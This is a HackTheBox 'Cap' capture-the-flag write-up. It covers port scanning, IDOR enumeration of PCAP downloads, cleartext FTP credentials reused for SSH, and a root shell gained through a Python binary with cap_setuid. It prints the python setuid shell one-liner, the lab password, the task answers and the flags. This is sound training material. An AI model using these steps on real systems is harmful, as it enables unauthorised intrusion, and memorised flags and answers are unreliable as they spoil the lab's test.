# 🚩 Cap - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/1-banner.png)

## General Information

| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | 🟢 Easy |
| **OS** | 🐧 Linux |
| **Mode** | 🧭 Guided Mode |
| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: Initial Foothold (nathan)](#-2-initial-foothold-nathan) <br> [3: Privilege Escalation (root)](#-3-privilege-escalation-root) <br> [4: Pwn3d !!](#-4-pwn3d-) |
| **Pwn Date** | 2026-06-27 |

---

## Executive Summary

*Hello everyone!! This is Reef the Inquirer✨. Quick and easy! Cap was a straightforward machine that gave me a textbook lesson on danger of cap_setuid capability.*

*A web page contained a "Security Snapshot" dashboard that let the logged-in user `Nathan` download a 5-second PCAP of his own network traffic. Bumping the numeric ID in `/data/{id}` down confirmed an Insecure Direct Object Reference (IDOR), and I let `Burp Suite`'s Intruder chew through a generated wordlist of IDs (`num.txt`) to see only snapshots actually exist on the server. Capture `0` turned out to be the juicy one: cracking it open in Wireshark handed me Nathan's FTP credentials in cleartext, which doubled as his SSH password too. From there, `getcap` command revealed that `/usr/bin/python3.8` had been left with the `cap_setuid` capability, and GTFOBins had the one-liner ready to go into a ROOT shell! 🚩*

---

## Tools Used

`Your mind and eyes!!`, `Nmap`, `Burp Suite`, `Wireshark`, `FTP`, `SSH`, `getcap`

---

## 🔍 1: Reconnaissance & Enumeration

**Attacker IP:** 10.10.16.167

**Target IP:** 10.129.52.173

### 1.1 Port Scanning

```bash
sudo nmap -T4 -p- 10.129.52.173
```

🧐 **Findings:**

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

The real enumeration kicks off upon finding a custom dashboard application hosted on port 80 over HTTP.😈

<details>
  <summary>🟢 Task 1: How many TCP ports are open?</summary>
  <br>
  3
</details>

### 1.2 Web Dashboard Enumeration

Browsing to `http://10.129.52.173` dropped me straight into a dashboard, logged in as a user called **Nathan**, showing live "Security Events", "Failed Login Attempts" and "Port Scans" widgets.

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/2-web-page.png)

🧐 **Findings:**

The sidebar exposed a feature called **"Security Snapshot (5 Second PCAP + Analysis)"**. Clicking it triggered a capture and redirected the browser to a URL of the form:

```
http://10.129.52.173/data/1
```

…which rendered a small analysis table, with a **Download** button that fetched a numbered file, `1.pcap`.

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/3-download.png)

<details>
  <summary>🟢 Task 2: After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?</summary>
  <br>
  data
</details>

Spotting an incrementing integer in the URL immediately triggered my IDOR radar, signaling the need for proper automated enumeration instead of poking around by hand.

So, to map out the accessible endpoints, I generated a wordlist of candidate directories from `0` to `100`:
```bash
seq 0 100 > num.txt
```

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/4-seq.png)

I then sent the `/data/1` request to **Burp Suite's Intruder**, marked the numeric ID as the injection point (`/data/§1§`), and loaded `num.txt` as the **Sniper** payload set:

```
GET /data/§1§ HTTP/1.1
Host: 10.129.52.173
```

* **Payload set:** `num.txt` (0–100), one request per line.
* **Attack type:** Sniper (single payload position on the ID).

Running the attack and sorting the results by **response length/status code** made the picture immediately obvious: only three IDs `0`, `1`, and `2` returned an HTTP `200` with a populated analysis table and an attached PCAP that I downloaded all of them.

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/5-down-all.png)

<details>
  <summary>🟢 Task 3: Are you able to get to other users' scans?</summary>
  <br>
  Yes
</details>

---

## 🚪 2: Initial Foothold (nathan)

### 2.1 Analyze PCAPs

A quick analysis of `1.pcap` and `2.pcap` revealed NO sensitive information, but `0.pcap` hit the jackpot. It is interesting that traffic immediately surfaced a full FTP login exchange in plaintext:

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/6-find-ftp.png)

```
USER nathan
PASS Buck3tH4TF0RM3!
230 Login successful.
```
<details>
  <summary>🟢 Task 4: What is the ID of the PCAP file that contains sensitive data?</summary>
  <br>
  0
</details>
<details>
  <summary>🟢 Task 5: Which application layer protocol in the pcap file can the sensitive data be found in?</summary>
  <br>
  FTP
</details>

So!! Easy as that — a leaked PCAP from the "secure" dashboard handed me a full set of valid credentials for the user `nathan`. Time to put them to use.👾

### 2.2 FTP & SSH Access as nathan

```bash
sudo ftp 10.129.52.173
```

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/7-ftp-login.png)

Sooo..

```bash
get user.txt
```

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/8-get-user-flag.png)

Back to our terminal and `cat` the result:

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/9-user-flag.png)

Here we go! 🚀 I'm `nathan` user and got the flag, let's continue

---

## 👑 3: Privilege Escalation (root)

Current User: `nathan`

Target User: `root`

Since the same credentials are very often reused across services, I went straight for SSH instead of staying stuck in FTP:

```bash
sudo ssh nathan@10.129.52.173
```
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/10-ssh.png)

<details>
  <summary>🟢 Task 6: We've managed to collect nathan's FTP password. On what other service does this password work?</summary>
  <br>
  SSH
</details>

To find a way to escalate our privileges, I check the system binary capabilities exist; they're a goldmine that's just as juicy as SUID but far less commonly audited:

```bash
getcap -r / 2>/dev/null
```
And we can see these results:

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/11-getcap.png)

* **`cap_setuid` on `/usr/bin/python3.8`:** This is the prize.
  
With the `cap_setuid` capability attached directly to the Python 3.8 interpreter, we can find a way in [GTFOBins](https://gtfobins.org/) website to be a root.

<details>
  <summary>🟢 Task 8: What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges?</summary>
  <br>
  /usr/bin/python3.8
</details>

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/12-GTFOBins.png)

That's the one:

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Running it against the capability-flagged interpreter:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/13-root-flag.png)

💥 **Root achieved!!**

---

## 🏁 4: Pwn3d !!

**🚩 User Flag:** `33b67b0ee0aca2c5ebe6b35ae82c23b7`

**🚩 Root Flag:** `882b29cc76af6730db771d1a589c21bf`

Two chained misconfigurations led to a full compromise. The lessons here are clear: always enforce server-side validation to prevent IDORs, never use plaintext protocols like FTP in production, and strictly audit or strip powerful Linux capabilities like `cap_setuid` from general-purpose binaries.

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Cap/14-Pwn3d!.png)

Created with 💜 by **The Inquirer, Reef**
